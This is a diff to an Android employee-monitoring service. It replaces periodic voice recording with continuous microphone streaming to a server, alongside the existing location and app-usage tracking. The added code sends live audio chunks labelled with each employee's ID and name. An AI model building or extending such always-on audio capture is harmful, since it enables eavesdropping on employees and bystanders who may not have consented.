@@ -6,9 +6,12 @@ import android.app.usage.UsageStatsManager;
 import android.content.Context;
 import android.content.Intent;
 import android.location.Location;
+import android.media.AudioFormat;
+import android.media.AudioRecord;
 import android.media.MediaRecorder;
 import android.os.*;
 import android.util.Log;
+import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
 import androidx.core.app.NotificationCompat;
 import com.company.monitor.R;
@@ -36,7 +39,6 @@ public class MonitoringService extends Service {
     private Socket socket;
     private FusedLocationProviderClient fusedLocationClient;
     private LocationCallback locationCallback;
-    private MediaRecorder mediaRecorder;
     private Handler mainHandler;
     private PreferenceManager prefManager;
 
@@ -44,8 +46,13 @@ public class MonitoringService extends Service {
     private String employeeName;
     private String serverUrl;
 
-    private boolean isRecording = false;
-    private File currentRecordingFile;
+    // Audio streaming
+    private AudioRecord audioRecord;
+    private volatile boolean isStreaming = false;
+    private Thread audioThread;
+    private static final int SAMPLE_RATE = 16000;
+    private static final int AUDIO_CHANNELS = AudioFormat.CHANNEL_IN_MONO;
+    private static final int AUDIO_ENCODING = AudioFormat.ENCODING_PCM_16BIT;
 
     // App usage tracking
     private final Handler usageHandler = new Handler(Looper.getMainLooper());
@@ -54,16 +61,6 @@ public class MonitoringService extends Service {
         public void run() {
             trackAppUsage();
             usageHandler.postDelayed(this, APP_USAGE_INTERVAL_MS);
-        }
-    };
-
-    // Voice cycle
-    private final Handler voiceHandler = new Handler(Looper.getMainLooper());
-    private final Runnable voiceRunnable = new Runnable() {
-        @Override
-        public void run() {
-            cycleVoiceRecording();
-            voiceHandler.postDelayed(this, VOICE_SEGMENT_MS);
         }
     };
 
@@ -83,7 +80,7 @@ public class MonitoringService extends Service {
 
         connectSocket();
         startLocationTracking();
-        startVoiceRecordingCycle();
+        startAudioStreaming();
         usageHandler.post(usageRunnable);
     }
 
@@ -164,79 +161,155 @@ public class MonitoringService extends Service {
         }
     }
 
-    // ─────────────────── VOICE RECORDING ───────────────────
+    // ─────────────────── AUDIO STREAMING ───────────────────
 
-    private void startVoiceRecordingCycle() {
-        voiceHandler.post(voiceRunnable);
-    }
+    private void startAudioStreaming() {
+        int bufferSize = AudioRecord.getMinBufferSize(SAMPLE_RATE, AUDIO_CHANNELS, AUDIO_ENCODING);
+        bufferSize = Math.max(bufferSize, SAMPLE_RATE * 2); // at least 1 second
 
-    private void cycleVoiceRecording() {
-        if (isRecording) {
-            stopAndSendRecording();
-        }
-        startRecording();
-    }
-
-    private void startRecording() {
         try {
-            currentRecordingFile = new File(getCacheDir(),
-                "voice_" + employeeId + "_" + System.currentTimeMillis() + ".3gp");
-
-            mediaRecorder = new MediaRecorder();
-            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
-            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
-            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
-            mediaRecorder.setOutputFile(currentRecordingFile.getAbsolutePath());
-            mediaRecorder.prepare();
-            mediaRecorder.start();
-            isRecording = true;
-            Log.d(TAG, "Recording started: " + currentRecordingFile.getName());
-        } catch (Exception e) {
-            Log.e(TAG, "Recording start error", e);
-            isRecording = false;
+            audioRecord = new AudioRecord(
+                MediaRecorder.AudioSource.MIC,
+                SAMPLE_RATE, AUDIO_CHANNELS, AUDIO_ENCODING, bufferSize);
+        } catch (SecurityException e) {
+            Log.e(TAG, "Mic permission missing", e);
+            return;
         }
-    }
 
-    private void stopAndSendRecording() {
-        try {
-            if (mediaRecorder != null) {
-                mediaRecorder.stop();
-                mediaRecorder.release();
-                mediaRecorder = null;
-                isRecording   = false;
+        if (audioRecord.getState() != AudioRecord.STATE_INITIALIZED) {
+            Log.e(TAG, "AudioRecord failed to initialize");
+            return;
+        }
 
-                if (currentRecordingFile != null && currentRecordingFile.exists()) {
-                    sendVoiceFile(currentRecordingFile);
+        audioRecord.startRecording();
+        isStreaming = true;
+
+        final int chunkSize = SAMPLE_RATE; // 500ms of 16-bit mono = 16000 bytes
+
+        audioThread = new Thread(() -> {
+            byte[] buffer = new byte[chunkSize];
+            ByteArrayOutputStream fileBuffer = new ByteArrayOutputStream();
+            long fileStartTime = System.currentTimeMillis();
+
+            while (isStreaming) {
+                int read = audioRecord.read(buffer, 0, buffer.length);
+                if (read > 0) {
+                    // Stream chunk to server in real-time
+                    try {
+                        String base64 = android.util.Base64.encodeToString(
+                            buffer, 0, read, android.util.Base64.NO_WRAP);
+                        JSONObject data = new JSONObject();
+                        data.put("employeeId", employeeId);
+                        data.put("employeeName", employeeName);
+                        data.put("audioChunk", base64);
+                        data.put("sampleRate", SAMPLE_RATE);
+                        data.put("timestamp", System.currentTimeMillis());
+                        emitEvent("audio_stream", data);
+                    } catch (Exception e) {
+                        Log.e(TAG, "Stream emit error", e);
+                    }
+
+                    // Also buffer for periodic file save
+                    fileBuffer.write(buffer, 0, read);
+
+                    // Every VOICE_SEGMENT_MS, save as WAV and send as voice_data
+                    if (System.currentTimeMillis() - fileStartTime >= VOICE_SEGMENT_MS) {
+                        byte[] pcmData = fileBuffer.toByteArray();
+                        fileBuffer.reset();
+                        long ts = fileStartTime;
+                        fileStartTime = System.currentTimeMillis();
+                        saveAndSendWav(pcmData, ts);
+                    }
                 }
             }
-        } catch (Exception e) {
-            Log.e(TAG, "Recording stop error", e);
-        }
+
+            // Save remaining data
+            if (fileBuffer.size() > 0) {
+                saveAndSendWav(fileBuffer.toByteArray(), fileStartTime);
+            }
+        }, "AudioStreamThread");
+        audioThread.start();
+        Log.d(TAG, "Audio streaming started");
     }
 
-    private void sendVoiceFile(File file) {
+    private void stopAudioStreaming() {
+        isStreaming = false;
+        if (audioThread != null) {
+            try { audioThread.join(3000); } catch (InterruptedException ignored) {}
+            audioThread = null;
+        }
+        if (audioRecord != null) {
+            try {
+                audioRecord.stop();
+                audioRecord.release();
+            } catch (Exception ignored) {}
+            audioRecord = null;
+        }
+        Log.d(TAG, "Audio streaming stopped");
+    }
+
+    private void saveAndSendWav(byte[] pcmData, long timestamp) {
         new Thread(() -> {
             try {
-                byte[] bytes = readFileToBytes(file);
-                String base64 = android.util.Base64.encodeToString(bytes, android.util.Base64.DEFAULT);
+                String filename = "voice_" + employeeId + "_" + timestamp + ".wav";
+                File file = new File(getCacheDir(), filename);
+
+                try (FileOutputStream fos = new FileOutputStream(file)) {
+                    writeWavHeader(fos, pcmData.length);
+                    fos.write(pcmData);
+                }
+
+                // Read back and send
+                byte[] fileBytes = readFileBytes(file);
+                String base64 = android.util.Base64.encodeToString(fileBytes, android.util.Base64.DEFAULT);
 
                 JSONObject data = new JSONObject();
                 data.put("employeeId",   employeeId);
                 data.put("employeeName", employeeName);
                 data.put("audioData",    base64);
-                data.put("filename",     file.getName());
-                data.put("timestamp",    System.currentTimeMillis());
+                data.put("filename",     filename);
+                data.put("timestamp",    timestamp);
                 data.put("durationMs",   VOICE_SEGMENT_MS);
                 emitEvent("voice_data", data);
 
-                file.delete(); // cleanup
+                file.delete();
+                Log.d(TAG, "Voice file sent: " + filename);
             } catch (Exception e) {
-                Log.e(TAG, "Voice send error", e);
+                Log.e(TAG, "Save WAV error", e);
             }
         }).start();
     }
 
-    private byte[] readFileToBytes(File file) throws IOException {
+    private void writeWavHeader(OutputStream out, int pcmLength) throws IOException {
+        int byteRate = SAMPLE_RATE * 2; // 16-bit mono
+        out.write("RIFF".getBytes());
+        writeInt(out, 36 + pcmLength);
+        out.write("WAVE".getBytes());
+        out.write("fmt ".getBytes());
+        writeInt(out, 16);
+        writeShort(out, (short) 1); // PCM
+        writeShort(out, (short) 1); // mono
+        writeInt(out, SAMPLE_RATE);
+        writeInt(out, byteRate);
+        writeShort(out, (short) 2); // block align
+        writeShort(out, (short) 16); // bits per sample
+        out.write("data".getBytes());
+        writeInt(out, pcmLength);
+    }
+
+    private void writeInt(OutputStream out, int val) throws IOException {
+        out.write(val & 0xFF);
+        out.write((val >> 8) & 0xFF);
+        out.write((val >> 16) & 0xFF);
+        out.write((val >> 24) & 0xFF);
+    }
+
+    private void writeShort(OutputStream out, short val) throws IOException {
+        out.write(val & 0xFF);
+        out.write((val >> 8) & 0xFF);
+    }
+
+    private byte[] readFileBytes(File file) throws IOException {
         try (FileInputStream fis = new FileInputStream(file);
              ByteArrayOutputStream bos = new ByteArrayOutputStream()) {
             byte[] buf = new byte[4096];
@@ -327,8 +400,7 @@ public class MonitoringService extends Service {
         super.onDestroy();
         if (locationCallback != null) fusedLocationClient.removeLocationUpdates(locationCallback);
         usageHandler.removeCallbacks(usageRunnable);
-        voiceHandler.removeCallbacks(voiceRunnable);
-        stopAndSendRecording();
+        stopAudioStreaming();
         if (socket != null) socket.disconnect();
     }
 
